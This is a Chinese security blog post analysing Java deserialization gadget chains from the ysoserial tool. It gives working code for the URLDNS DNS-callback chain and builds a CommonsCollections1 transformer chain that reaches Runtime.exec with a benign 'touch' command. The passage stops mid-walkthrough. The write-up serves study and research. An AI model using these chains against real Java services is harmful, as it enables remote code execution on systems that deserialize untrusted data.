<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>ysoserial URLDNS, CommonsCollectionsX 分析 - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="之前都是 ysoserial 一把梭, 还是得学习 + 复现一下内部实现机制的."><meta property="og:image" content><meta property="og:title" content="ysoserial URLDNS, CommonsCollectionsX 分析"><meta property="og:description" content="之前都是 ysoserial 一把梭, 还是得学习 + 复现一下内部实现机制的."><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2020/01/20/ysoserial-URLDNS-CommonsCollectionsX-%E5%88%86%E6%9E%90/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-01-20T17:45:51+00:00"><meta property="article:modified_time" content="2020-01-20T17:45:51+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="ysoserial URLDNS, CommonsCollectionsX 分析"><meta name=twitter:description content="之前都是 ysoserial 一把梭, 还是得学习 + 复现一下内部实现机制的."><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.21410c161c7e5bcadc5a4eccf49ce5a024e0e8fc19babbd534cfe87972f5ee51.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/about>关于</a>&nbsp;
<a href=/links>友链</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>ysoserial URLDNS, CommonsCollectionsX 分析</h1><div class=meta>发表于 2020 年 1 月 20 日</div></div><section class=body><p>之前都是 ysoserial 一把梭, 还是得学习 + 复现一下内部实现机制的.</p><h2 id=urldns>URLDNS</h2><p>最简单的一个, 这个成因就是 <code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.</p><p><img src=https://i.loli.net/2020/01/20/onW3ErpxJT2mK1z.png alt><br><img src=https://i.loli.net/2020/01/20/xJrPjCgF5eh1Kfs.png alt></p><p>而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p><p><img src=https://i.loli.net/2020/01/20/tzER6LIsc125OU7.png alt><br><img src=https://i.loli.net/2020/01/20/53j1fLybKRUHsYV.png alt></p><p>可以理解为, 在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL 这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求.</p><p>整条调用链如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Gadget Chain:
</span></span><span style=display:flex><span>  HashMap.readObject()
</span></span><span style=display:flex><span>    HashMap.putVal()
</span></span><span style=display:flex><span>      HashMap.hash()
</span></span><span style=display:flex><span>        URL.hashCode()
</span></span></code></pre></div><p>URLDNS.java</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> demo.rmb122<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.FileOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Field<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.net.URL<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.HashMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>URLDNS</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> Exception <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        HashMap<span style=color:#ff79c6>&lt;</span>URL<span style=color:#ff79c6>,</span> String<span style=color:#ff79c6>&gt;</span> hashMap <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>&lt;</span>URL<span style=color:#ff79c6>,</span> String<span style=color:#ff79c6>&gt;();</span>
</span></span><span style=display:flex><span>        URL url <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> URL<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;http://xxxx.xxx.xxx&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        Field f <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;java.net.URL&#34;</span><span style=color:#ff79c6>).</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;hashCode&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        f<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        f<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>url<span style=color:#ff79c6>,</span> 0xdeadbeef<span style=color:#ff79c6>);</span> <span style=color:#6272a4>// 设一个值, 这样 put 的时候就不会去查询 DNS
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>        hashMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>url<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;rmb122&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        f<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>url<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>-</span>1<span style=color:#ff79c6>);</span> <span style=color:#6272a4>// hashCode 这个属性不是 transient 的, 所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectOutputStream<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileOutputStream<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;out.bin&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>writeObject</span><span style=color:#ff79c6>(</span>hashMap<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>Test.java</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> demo.rmb122<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.FileInputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectInputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>Test</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> Exception <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectInputStream<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileInputStream<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;out.bin&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        ois<span style=color:#ff79c6>.</span><span style=color:#50fa7b>readObject</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><h2 id=commonscollections1>CommonsCollections1</h2><p>这个利用链比较复杂, 借 ysoserial 自带的调用栈先看看吧,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Gadget chain:
</span></span><span style=display:flex><span>    ObjectInputStream.readObject()
</span></span><span style=display:flex><span>        AnnotationInvocationHandler.readObject()
</span></span><span style=display:flex><span>            Map(Proxy).entrySet()
</span></span><span style=display:flex><span>                AnnotationInvocationHandler.invoke()
</span></span><span style=display:flex><span>                    LazyMap.get()
</span></span><span style=display:flex><span>                        ChainedTransformer.transform()
</span></span><span style=display:flex><span>                            ConstantTransformer.transform()
</span></span><span style=display:flex><span>                            InvokerTransformer.transform()
</span></span><span style=display:flex><span>                                Method.invoke()
</span></span><span style=display:flex><span>                                    Class.getMethod()
</span></span><span style=display:flex><span>                            InvokerTransformer.transform()
</span></span><span style=display:flex><span>                                Method.invoke()
</span></span><span style=display:flex><span>                                    Runtime.getRuntime()
</span></span><span style=display:flex><span>                            InvokerTransformer.transform()
</span></span><span style=display:flex><span>                                Method.invoke()
</span></span><span style=display:flex><span>                                    Runtime.exec()
</span></span></code></pre></div><p>首先是版本受限, 先看 ysoserial 自带的版本检测 (单元测试的时候用的),</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>boolean</span> <span style=color:#50fa7b>isAnnInvHUniversalMethodImpl</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    JavaVersion v <span style=color:#ff79c6>=</span> JavaVersion<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getLocalVersion</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> v <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>(</span>v<span style=color:#ff79c6>.</span><span style=color:#50fa7b>major</span> <span style=color:#ff79c6>&lt;</span> 8 <span style=color:#ff79c6>||</span> <span style=color:#ff79c6>(</span>v<span style=color:#ff79c6>.</span><span style=color:#50fa7b>major</span> <span style=color:#ff79c6>==</span> 8 <span style=color:#ff79c6>&amp;&amp;</span> v<span style=color:#ff79c6>.</span><span style=color:#50fa7b>update</span> <span style=color:#ff79c6>&lt;=</span> 71<span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>亲测 u71 实际已经修复了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 中的漏洞, 所以实际上 ysoseiral 检测的是有问题的&mldr;</p><p>应该是 <code>v.update &lt; 71</code> 才对. 在 <code>https://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html</code> 可以下到老版 jdk.<br>以下代码均以小于 u71 的能下到的最新版本 u66 为例子.</p><p>这个链相对比较复杂, 所以倒着来, 从 <code>LazyMap.get()</code> 开始.</p><p>org.apache.commons.collections.map.LazyMap</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>Object key<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!</span><span style=color:#8be9fd;font-style:italic>super</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>map</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>containsKey</span><span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Object value <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>factory</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>transform</span><span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>super</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>map</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>,</span> value<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> value<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#8be9fd;font-style:italic>super</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>map</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>在 get 这个 map 时, 如果内部的 map 不存在这个 key, 将会调用 <code>this.factory.transform(key)</code>, 将结果作为返回值. 再来看属性定义</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>protected</span> <span style=color:#8be9fd;font-style:italic>final</span> Transformer factory<span style=color:#ff79c6>;</span>
</span></span></code></pre></div><p>而 Transformer 是一个基类, ChainedTransformer, ConstantTransformer, InvokerTransformer 均继承于此父类. 接下来看如果通过 <code>this.factory.transform(key)</code> 达到 RCE 的效果.</p><p>org.apache.commons.collections.functors.ChainedTransformer</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span> <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#50fa7b>ChainedTransformer</span><span style=color:#ff79c6>(</span>Transformer<span style=color:#ff79c6>[]</span> transformers<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iTransformers</span> <span style=color:#ff79c6>=</span> transformers<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>transform</span><span style=color:#ff79c6>(</span>Object object<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span><span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iTransformers</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span> <span style=color:#ff79c6>++</span>i<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        object <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iTransformers</span><span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>].</span><span style=color:#50fa7b>transform</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> object<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>ChainedTransformer 的作用是将内部的 iTransformers 按顺序都调用一遍.</p><p>org.apache.commons.collections.functors.ConstantTransformer</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#50fa7b>ConstantTransformer</span><span style=color:#ff79c6>(</span>Object constantToReturn<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iConstant</span> <span style=color:#ff79c6>=</span> constantToReturn<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>transform</span><span style=color:#ff79c6>(</span>Object input<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iConstant</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>ConstantTransformer 的作用是不管输入, 直接返回一个常量.</p><p>最后是重点 org.apache.commons.collections.functors.InvokerTransformer</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#50fa7b>InvokerTransformer</span><span style=color:#ff79c6>(</span>String methodName<span style=color:#ff79c6>,</span> Class<span style=color:#ff79c6>[]</span> paramTypes<span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iMethodName</span> <span style=color:#ff79c6>=</span> methodName<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iParamTypes</span> <span style=color:#ff79c6>=</span> paramTypes<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iArgs</span> <span style=color:#ff79c6>=</span> args<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>transform</span><span style=color:#ff79c6>(</span>Object input<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>input <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            Class cls <span style=color:#ff79c6>=</span> input<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>            Method method <span style=color:#ff79c6>=</span> cls<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getMethod</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iMethodName</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iParamTypes</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>invoke</span><span style=color:#ff79c6>(</span>input<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iArgs</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>NoSuchMethodException var5<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> FunctorException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;InvokerTransformer: The method &#39;&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iMethodName</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;&#39; on &#39;&#34;</span> <span style=color:#ff79c6>+</span> input<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;&#39; does not exist&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>IllegalAccessException var6<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> FunctorException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;InvokerTransformer: The method &#39;&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iMethodName</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;&#39; on &#39;&#34;</span> <span style=color:#ff79c6>+</span> input<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;&#39; cannot be accessed&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>InvocationTargetException var7<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> FunctorException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;InvokerTransformer: The method &#39;&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iMethodName</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;&#39; on &#39;&#34;</span> <span style=color:#ff79c6>+</span> input<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;&#39; threw an exception&#34;</span><span style=color:#ff79c6>,</span> var7<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>这个的作用是调用输入对象的一个方法, 并且参数可控, 这就非常牛逼了, 将这些结合起来, 如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>Transformer<span style=color:#ff79c6>[]</span> transformers <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>new</span> ConstantTransformer<span style=color:#ff79c6>(</span>java<span style=color:#ff79c6>.</span><span style=color:#50fa7b>lang</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>Runtime</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;getMethod&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Class<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;getRuntime&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{}}),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;invoke&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>Object<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>null</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{}}),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;exec&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>new</span> String<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;/bin/touch&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;/dev/shm/rmb122_pwned&#34;</span><span style=color:#ff79c6>}}),</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ChainedTransformer chainedTransformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ChainedTransformer<span style=color:#ff79c6>(</span>transformers<span style=color:#ff79c6>);</span>
